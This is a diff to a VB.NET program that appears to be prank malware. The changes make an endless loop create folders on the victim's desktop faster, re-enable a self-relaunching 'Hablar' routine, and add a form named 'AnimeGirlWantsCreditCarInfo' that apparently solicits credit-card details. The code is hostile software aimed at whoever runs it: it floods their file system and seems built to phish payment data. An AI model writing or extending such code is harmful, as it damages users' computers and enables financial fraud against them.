@@ -29,6 +29,14 @@ Public Class Principal
                 PocasCarpetas()
             ElseIf parametro = "/Hablar" Then
                 Hablar()
+            ElseIf parametro.StartsWith("/AnimeGirlWantsCreditCarInfo") Then
+                Try
+                    Dim args() As String = parametro.Split(" ")
+                    AnimeGirlWantsCreditCarInfo.ReadParameters(args(1) & " " & args(2))
+                Catch
+                End Try
+                AnimeGirlWantsCreditCarInfo.Show()
+                AnimeGirlWantsCreditCarInfo.Focus()
             End If
         Catch ex As Exception
 
@@ -42,13 +50,13 @@ Public Class Principal
 
             Process.Start(Application.ExecutablePath, "/KeyCaps")
 
-            Process.Start(Application.ExecutablePath, "/RefreshIt")
+            'Process.Start(Application.ExecutablePath, "/RefreshIt") 'Muy, demasiado molesto
 
-            Process.Start(Application.ExecutablePath, "/CloseIt")
+            'Process.Start(Application.ExecutablePath, "/CloseIt") 'Muy, demasiado molesto
 
             Process.Start(Application.ExecutablePath, "/PocasCarpetas")
 
-            'Process.Start(Application.ExecutablePath, "/Hablar") 'No funciona
+            Process.Start(Application.ExecutablePath, "/Hablar")
             End
         Catch
         End Try
@@ -87,7 +95,7 @@ Public Class Principal
     Sub PocasCarpetas() 'Funciona!
         Dim Contador = 0
         While True
-            Threading.Thread.Sleep(655)
+            Threading.Thread.Sleep(420)
             System.IO.Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) & "\x" & Contador & "_XD")
             Contador += 1
         End While
